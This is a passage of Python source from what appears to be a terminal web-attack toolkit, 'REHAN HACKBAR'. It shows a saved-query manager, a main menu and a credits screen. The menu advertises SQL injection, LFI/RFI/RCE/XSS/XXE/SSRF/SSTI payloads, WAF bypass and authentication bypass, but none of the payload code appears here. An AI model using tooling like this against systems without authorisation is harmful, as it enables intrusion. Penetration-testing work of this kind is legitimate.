        if data.get('target'):
            print(f"{Colors.OKCYAN}Target:{Colors.ENDC} {data['target']}")
        print(f"{Colors.OKCYAN}Created:{Colors.ENDC} {data.get('created', 'Unknown')}")
        
        copy = prompt("\nCopy query to clipboard? (y/n)")
        if copy.lower() == 'y':
            pyperclip_copy(data['query'])
            success("Query copied!")
    
    def search_queries(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SEARCH QUERIES ]{Colors.ENDC}")
        separator()
        
        term = prompt("Enter search term")
        if not term:
            press_enter()
            return
        
        term = term.lower()
        found = []
        
        for name, data in self.queries.items():
            if (term in name.lower() or 
                term in data.get('category', '').lower() or
                term in data.get('query', '').lower() or
                term in data.get('description', '').lower()):
                found.append(name)
        
        if found:
            print(f"\n{Colors.OKGREEN}Found {len(found)} queries:{Colors.ENDC}\n")
            for name in found:
                print(f"  {Colors.WHITE}{name} [{self.queries[name].get('category', 'General')}]{Colors.ENDC}")
            
            name = prompt("\nEnter query name to view details (or Enter to go back)")
            if name and name in self.queries:
                self._show_query_detail(name)
        else:
            warning("No queries found!")
        
        press_enter()
    
    def edit_query(self):
        name = prompt("Enter query name to edit")
        if not name or name not in self.queries:
            error("Query not found!")
            press_enter()
            return
        
        data = self.queries[name]
        print(f"\n{Colors.OKCYAN}Current query:{Colors.ENDC}\n{Colors.WHITE}{data['query']}{Colors.ENDC}\n")
        
        new_query = prompt("Enter new query (or Enter to keep current)")
        if new_query:
            data['query'] = new_query
        
        new_desc = prompt("Enter new description (or Enter to keep current)")
        if new_desc:
            data['description'] = new_desc
        
        self._save_queries()
        success("Query updated!")
        press_enter()
    
    def delete_query(self):
        name = prompt("Enter query name to delete")
        if not name or name not in self.queries:
            error("Query not found!")
            press_enter()
            return
        
        confirm = prompt(f"Are you sure you want to delete '{name}'? (y/n)")
        if confirm.lower() == 'y':
            del self.queries[name]
            self._save_queries()
            success("Query deleted!")
        
        press_enter()
    
    def export_queries(self):
        filename = prompt("Enter filename (default: custom_queries_export.json)")
        if not filename:
            filename = f"custom_queries_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.queries, f, indent=2)
        success(f"Queries exported to: {filename}")
        press_enter()
    
    def import_queries(self):
        filename = prompt("Enter filename to import")
        if not filename or not os.path.exists(filename):
            error("File not found!")
            press_enter()
            return
        
        try:
            with open(filename, 'r') as f:
                imported = json.load(f)
            
            merge = prompt("Merge with existing queries? (y=merge, n=replace)")
            if merge.lower() == 'y':
                self.queries.update(imported)
            else:
                self.queries = imported
            
            self._save_queries()
            success(f"Imported {len(imported)} queries!")
        except Exception as e:
            error(f"Import failed: {str(e)}")
        
        press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────────────────────────────────────

def main():
    sqli = SQLInjection()
    web_attacks = WebAttacks()
    encoding = EncodingTools()
    admin_finder = AdminFinder()
    web_tools = WebTools()
    custom_queries = CustomQueries()
    
    while True:
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ MAIN MENU ]{Colors.ENDC}")
        separator()
        print(f"""
    {Colors.OKGREEN}[1]{Colors.ENDC} SQL Injection Module
    {Colors.OKGREEN}[2]{Colors.ENDC} Web Attacks Module (LFI, RFI, RCE, XSS, XXE, SSRF, SSTI)
    {Colors.OKGREEN}[3]{Colors.ENDC} Encoding/Decoding Tools
    {Colors.OKGREEN}[4]{Colors.ENDC} Admin Panel Finder
    {Colors.OKGREEN}[5]{Colors.ENDC} Web Tools (Hash, SQLi Scanner, Reverse IP, Subdomain)
    {Colors.OKGREEN}[6]{Colors.ENDC} Custom Query Saver
    {Colors.OKGREEN}[7]{Colors.ENDC} Credit & About
    {Colors.OKGREEN}[0]{Colors.ENDC} Exit
        """)
        
        choice = prompt("Select an option")
        
        if choice == "1":
            sqli.menu()
        elif choice == "2":
            web_attacks.menu()
        elif choice == "3":
            encoding.menu()
        elif choice == "4":
            admin_finder.menu()
        elif choice == "5":
            web_tools.menu()
        elif choice == "6":
            custom_queries.menu()
        elif choice == "7":
            show_credit()
        elif choice == "0":
            clear()
            banner()
            print(f"\n{Colors.OKGREEN}Thank you for using REHAN HACKBAR!{Colors.ENDC}")
            print(f"{Colors.OKCYAN}Credit: Syed Rehan{Colors.ENDC}")
            print(f"{Colors.OKCYAN}Developer: @rehuux{Colors.ENDC}")
            print(f"{Colors.WARNING}Use responsibly for ethical security testing only.{Colors.ENDC}\n")
            break
        else:
            error("Invalid option!")
            time.sleep(1)

def show_credit():
    clear()
    banner()
    print(f"{Colors.OKCYAN}{Colors.BOLD}[ CREDIT & ABOUT ]{Colors.ENDC}")
    separator()
    print(f"""
    {Colors.OKGREEN}Tool:{Colors.ENDC} REHAN HACKBAR v1.0
    {Colors.OKGREEN}Description:{Colors.ENDC} Advanced Web Penetration Testing Tool - Terminal Edition
    
    {Colors.OKGREEN}Credit:{Colors.ENDC} Syed Rehan
    {Colors.OKGREEN}Developer:{Colors.ENDC} @rehuux
    
    {Colors.OKGREEN}Inspiration:{Colors.ENDC} Based on DH-HackBar by Team Darknet Haxor
    {Colors.OKGREEN}GitHub:{Colors.ENDC} https://github.com/darknethaxor/DH-HackBar
    
    {Colors.WARNING}Disclaimer:{Colors.ENDC}
    This tool is built for ethical penetration testing and learning purposes only.
    We never support or provoke any unethical, harmful and illegal activity.
    The developer will not be responsible for any misuse of the tool.
    
    {Colors.OKCYAN}Always obtain proper authorization before testing any system.{Colors.ENDC}
    
    {Colors.GRAY}Features:{Colors.ENDC}
    - SQL Injection (Union, Error, Boolean, Time-based, DIOS queries)
    - LFI / RFI / RCE / XSS / XXE / SSRF / SSTI Payloads
    - Encoding/Decoding (URL, Base64, Hex, Binary, ASCII, ROT13, HTML)
    - Hashing (MD5, SHA1, SHA256, SHA512)
    - Admin Panel Finder (500+ paths)
    - Web Tools (Hash Decrypt, SQLi Scanner, Reverse IP, Subdomain)
    - Custom Query Saver
    - WAF Bypass Techniques
    - PostgreSQL & MSSQL Injection
    - Authentication Bypass
    
    {Colors.OKGREEN}Stay Ethical. Hack Responsibly.{Colors.ENDC}
    """)
    press_enter()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print(f"\n{Colors.OKGREEN}Goodbye!{Colors.ENDC}")
        print(f"{Colors.OKCYAN}Credit: Syed Rehan | Developer: @rehuux{Colors.ENDC}\n")
        sys.exit(0)
